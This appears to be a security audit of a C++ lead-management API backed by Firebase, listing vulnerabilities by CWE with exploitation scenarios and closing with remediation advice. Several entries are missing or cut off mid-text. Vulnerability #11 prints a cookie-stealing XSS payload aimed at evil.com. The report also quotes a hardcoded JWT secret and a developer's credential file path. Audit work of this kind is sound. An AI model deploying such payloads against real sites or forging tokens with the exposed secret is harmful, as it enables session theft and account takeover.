--- Vulnerability #1 ---
CWE ID: CWE-798
Name: Hardcoded Credentials / Secret Key
Severity: Critical
File: src/main.cpp
Line: 15
Description:
The JWT signing secret is hardcoded directly in the source code as a string
literal: "lead-manager-jwt-secret-change-in-production". Although the variable
name suggests it should be changed in production, no mechanism enforces this.
The default value is used unless explicitly overridden via the --secret
command-line argument. If deployed without changing this value, all JWT tokens
can be forged by any attacker who reads the source code or binary.
Exploitation:
An attacker who knows this default secret can craft arbitrary JWT tokens,
impersonating any user in the system, gaining full access to all leads and
accounts. The string can be extracted from compiled binaries using simple
tools like `strings`.

--- Vulnerability #2 ---
CWE ID: CWE-798
Name: Hardcoded Firebase Credentials Path
Severity: Critical
File: src/main.cpp
Lines: 12-13
Description:
The path to the Firebase service account credentials JSON file is hardcoded
as an absolute filesystem path:
"C:/Users/tonil/Desktop/tcc/lead-manager-54595-firebase-adminsdk-fbsvc-375221693a.json".
This exposes the developer's username, the project structure, and the Firebase
project ID. If this source code is published to a repository, the credentials
file name and its location are disclosed. More critically, the filename itself
reveals the Firebase project identifier ("lead-manager-54595") and the service
account key ID ("375221693a").
Exploitation:
An attacker with access to the source code knows the exact Firebase project
and can target it. If the credentials file is accidentally committed to
version control, the attacker gains full Firebase admin access.

--- Vulnerability #3 ---
CWE ID: CWE-942
Name: Overly Permissive CORS Configuration
Severity: High
File: src/main.cpp
Lines: 38-42
Description:
The server sets "Access-Control-Allow-Origin" to "*", allowing any website on
the internet to make cross-origin requests to the API. Combined with
"Access-Control-Allow-Headers" including "Authorization", this means any
malicious website can make authenticated API calls on behalf of a user whose
browser has a valid token.
Exploitation:
An attacker hosts a malicious webpage that makes AJAX requests to the Lead
Manager API. If a victim with a valid JWT token visits this page, the attacker's
JavaScript can read, modify, and delete all of the victim's leads via cross-
origin requests. This effectively bypasses same-origin protections.

--- Vulnerability #4 ---
CWE ID: CWE-352
Name: Cross-Site Request Forgery (CSRF)
Severity: Medium
File: src/main.cpp
Lines: 50-80
Description:
The application has no CSRF protection mechanism. While it uses Bearer token
authentication (which provides some CSRF resistance since tokens must be
manually attached), the wildcard CORS policy (vulnerability #3) combined with
the lack of any CSRF tokens means that if an attacker can obtain or predict the
JWT token, there is no secondary defense against forged requests.
Exploitation:
In combination with XSS or token theft, an attacker can forge state-changing
requests (create, update, delete leads) without any CSRF token validation.

--- Vulnerability #5 ---
CWE ID: CWE-319
Name: Cleartext Transmission of Sensitive Data (No HTTPS Enforcement)
Severity: High
File: src/main.cpp
Lines: 36, 88
Description:
The server is instantiated as a plain httplib::Server (not httplib::SSLServer),
meaning it listens on HTTP without TLS encryption. All traffic, including
authentication credentials (passwords in login/signup requests), JWT tokens
in Authorization headers, and lead data, is transmitted in cleartext.
Exploitation:
An attacker performing network sniffing (e.g., on a shared WiFi network or
via ARP spoofing) can intercept all usernames, passwords, JWT tokens, and
business data in transit. Captured JWT tokens allow full account takeover.

File: src/main.cpp

--- Vulnerability #8 ---
CWE ID: CWE-521
Name: Weak Password Requirements
Severity: Medium
File: src/auth_controller.cpp
Lines: 37-42
Description:
The only password validation is a minimum length check of 6 characters.
There are no requirements for complexity (uppercase, lowercase, digits,
special characters). This allows trivially guessable passwords like
"123456" or "aaaaaa".
Exploitation:
Combined with the lack of rate limiting (vulnerability #7), weak passwords
make brute-force and dictionary attacks highly effective. Common passwords
of 6 characters can be cracked in seconds.

--- Vulnerability #9 ---
CWE ID: CWE-918
Name: Server-Side Request Forgery (SSRF) via Unsanitized Path Components
Severity: High
File: src/firebase_client.cpp
Lines: 136, 152, 168, 181, 191-193
Description:
The collection name and document ID parameters are concatenated directly into
URL paths sent to the Firestore API without any sanitization or validation.
In functions like get_document, update_document, and delete_document, the
doc_id is appended to the path string. While the Firestore API itself may
reject some malformed paths, there is no application-level validation.
Additionally, in update_document (line 170), field names from user input are
concatenated directly into query string parameters (updateMask.fieldPaths=),
allowing query parameter injection.
Exploitation:
An attacker could craft a document ID containing path traversal characters
(e.g., "../" or URL-encoded variants) or additional query parameters to
manipulate Firestore API requests. In update_document specifically, injecting
a field name containing "&" could add arbitrary query parameters to the
Firestore request.

--- Vulnerability #10 ---
CWE ID: CWE-20
Name: Missing Input Validation on Lead Data Fields
Severity: Medium
File: src/lead_controller.cpp
Lines: 37-50
Description:
When creating a lead, only the "full_name" field is validated for non-empty
value. The email, phone, status, and source fields accept any arbitrary string

--- Vulnerability #11 ---
CWE ID: CWE-79
Name: Stored Cross-Site Scripting (XSS) via Lead Data
Severity: High
File: src/lead_controller.cpp
Lines: 37-50, 67, 190
File: src/models.h
Lines: 37-44
Description:
Lead data (full_name, email, phone, company, position, source, notes) is
stored and returned without any output encoding or sanitization. The
application serves a static directory (main.cpp line 48:
svr.set_mount_point("/", "./static")), suggesting a frontend that consumes
this API data. If the frontend renders any of these fields without proper
escaping, stored XSS attacks are possible. The server itself sets no
Content-Security-Policy headers.
Exploitation:
An attacker creates a lead with a full_name such as
"<script>document.location='http://evil.com/?c='+document.cookie</script>".
When another user views this lead in the frontend, the script executes in
their browser, allowing cookie theft, session hijacking, or further attacks.

--- Vulnerability #12 ---
CWE ID: CWE-295
Name: TLS Verification Disabled for Build Dependencies
Severity: Medium
File: CMakeLists.txt
Lines: 10-11, 21, 28, 36
Description:
The CMake configuration sets CMAKE_TLS_VERIFY=OFF and FETCHCONTENT_TLS_VERIFY=OFF,
and each FetchContent_Declare uses GIT_CONFIG http.sslVerify=false. This

Exploitation:
An attacker performing a man-in-the-middle attack on the network during the
build process could substitute malicious code for any of the three
dependencies (httplib, nlohmann_json, jwt-cpp). The compromised dependency
would be compiled into the application binary, giving the attacker arbitrary
code execution.

--- Vulnerability #14 ---

Name: Denial of Service via Unrestricted CSV Import Size
Severity: Low
File: src/lead_controller.cpp
Lines: 286-333
Description:
The CSV import endpoint accepts CSV data without any limit on file size or
number of records. Each imported row results in an individual HTTP request
to Firebase to create a document. An attacker can upload a CSV with millions

Exploitation:

CSV body containing millions of rows. This triggers millions of Firebase write

generating significant cloud costs.

--- Vulnerability #15 ---
CWE ID: CWE-613
Name: Insufficient Session Expiration / No Token Revocation
Severity: Low
File: src/jwt_utils.cpp
Lines: 51-60
Description:
JWT tokens are created with a 24-hour expiration (line 58:
std::chrono::hours{24}) and there is no token revocation mechanism. Once a
token is issued, it cannot be invalidated before its expiration time. There is
no server-side session tracking, token blacklist, or refresh token rotation.
Exploitation:
If a user's token is compromised, there is no way to revoke it. The attacker
retains access for up to 24 hours. Even if the user changes their password,
previously issued tokens remain valid until expiration.

--- Vulnerability #16 ---
CWE ID: CWE-1188
Name: Insecure Default - Server Binds to All Interfaces
Severity: High
File: src/main.cpp
Line: 88
Description:
The server binds to "0.0.0.0" (all network interfaces) by default. Combined
with the lack of TLS (vulnerability #5), this means the unencrypted HTTP
server is exposed on all network interfaces, including any public-facing
ones, without any access controls.
Exploitation:
If deployed on a machine with a public IP address, the API is accessible from
the entire internet without encryption. An attacker anywhere on the network
can send requests, intercept credentials, and access the API.

================================================================================
RECOMMENDATIONS
================================================================================

1. CRITICAL: Move all secrets (JWT secret, Firebase credentials path) to
   environment variables. Never hardcode secrets in source code. Use a secrets
   management solution for production deployments.

2. CRITICAL: Enable HTTPS by using httplib::SSLServer instead of httplib::Server,
   or deploy behind a reverse proxy (e.g., nginx) that terminates TLS.

3. HIGH: Restrict CORS to specific trusted origins instead of using wildcard "*".

4. HIGH: Implement rate limiting on authentication endpoints (login and signup)
   to prevent brute-force attacks.

5. HIGH: Add input validation and output encoding/sanitization for all user-
   supplied data to prevent XSS attacks.

6. HIGH: Sanitize and validate document IDs and field names before incorporating
   them into Firestore API URL paths and query parameters.

7. MEDIUM: Enforce stronger password requirements (minimum 8 characters,
   complexity rules).

8. MEDIUM: Implement token revocation capability (e.g., token blacklist or
   server-side session tracking).

9. MEDIUM: Add Content-Security-Policy headers to mitigate XSS impact.

10. MEDIUM: Enable TLS verification in CMakeLists.txt for dependency downloads
    or pin dependency hashes.

11. MEDIUM: Limit CSV import file size and record count.

12. LOW: Sanitize error messages returned to clients; log detailed errors
    server-side only.

13. LOW: Bind to localhost (127.0.0.1) by default and require explicit
    configuration to bind to all interfaces.

14. LOW: Implement CSRF protection as a defense-in-depth measure.
